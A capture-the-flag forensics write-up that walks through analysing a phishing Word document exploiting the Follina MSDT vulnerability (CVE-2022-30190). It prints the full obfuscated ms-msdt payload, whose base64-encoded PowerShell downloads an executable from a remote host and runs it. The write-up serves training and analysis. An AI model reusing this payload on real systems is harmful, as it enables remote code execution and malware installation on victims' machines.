<h1>
    Diagnosis - Forensics, 20pts
</h1>

<h2>
    Claim: A very nice real-case challenge of CVE 2022-30190
    
</h2>
<h3>
    Description
</h3>

Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on.


<h3>
    Solution
</h3>

- At first, I had to figure out how to download the file. It turned out all I need to do is to replace the domain with the IP and Port of the docker so it becomes like this: <code>http://[IP:PORT]/layoffs.doc</code>
- After getting the file, I ran it in a sandbox online. The behavior is Word crashed and then a dialog appeared to diagnose. Luckily, in the process session of the sandbox, it detected <code>WINWORD.EXE</code> is malicious and labeled it as "CVE 2022-30190".
 
![](https://i.imgur.com/6VOLqYW.png)

- I googled about this CVE and found out that this is a famous one which uses an utility of Windows called "Microsoft Windows Support Diagnostic Tool (MSDT)" to exploit RCE vulnerability by downloading the HTML containing Powershell code and execute it to gain access.

- There were so many videos of how to exploit this vuln but I found this video of John Hammond [https://www.youtube.com/watch?v=dGCOhORNKRk](https://) carefully explained it.
- Now open it in kali:
![](https://i.imgur.com/kK8Hj5N.png)

- In the content of the file <code>/word/_rels/document.xml.rels</code> I found a malicous link <code>http://diagnostic.htb:30046/223_index_style_fancy.html!</code>

- This could be that malicious HTML but I had to again replace the domain with the IP and Port of the docker to get it. 

![](https://i.imgur.com/JtJ6Dyz.png)

- Now open and get the obfuscated script:
![](https://i.imgur.com/dXIfPkJ.png)

- This part was maybe for trolling because it is a base64-encoded poem
```
    
```

- Deobfuscate it:
```
ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JHtmYGlsZX0gPSAoIns
3fXsxfXs2fXs4fXs1fXszfXsyfXs0fXswfSItZid9LmV4ZScsJ0J7bXNEdF80c19BX3ByMCcsJ0UnLCdyLi4ucycsJzNNc
19iNEQnLCdsMycsJ3RvQycsJ0hUJywnMGxfaDRuRCcpCiYoInsxfXsyfXswfXszfSItZid1ZXMnLCdJbnZva2UnLCctV2V
iUmVxJywndCcpICgiezJ9ezh9ezB9ezR9ezZ9ezV9ezN9ezF9ezd9Ii1mICc6Ly9hdScsJy5odGIvMicsJ2gnLCdpYycsJ
3RvJywnYWdub3N0JywnbWF0aW9uLmRpJywnL24uZXhlJywndHRwcycpIC1PdXRGaWxlICJDOlxXaW5kb3dzXFRhc2tzXCR
maWxlIgomKCgoIns1fXs2fXsyfXs4fXswfXszfXs3fXs0fXsxfSIgLWYnTDlGVGFza3NMOUYnLCdpbGUnLCdvdycsJ0wnL
CdmJywnQzonLCdMOUZMOUZXaW5kJywnOUZrekgnLCdzTDlGJykpICAtQ1JlcGxBY2Una3pIJyxbY2hBcl0zNiAtQ1JlcGx
BY2UoW2NoQXJdNzYrW2NoQXJdNTcrW2NoQXJdNzApLFtjaEFyXTkyKQo="))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; 
```

- Now run the decode function:

![](https://i.imgur.com/Do4yo4W.png)

- Run the first part or print out the <code>file</code> variable to get the flag

![](https://i.imgur.com/h8WQQ0B.png)
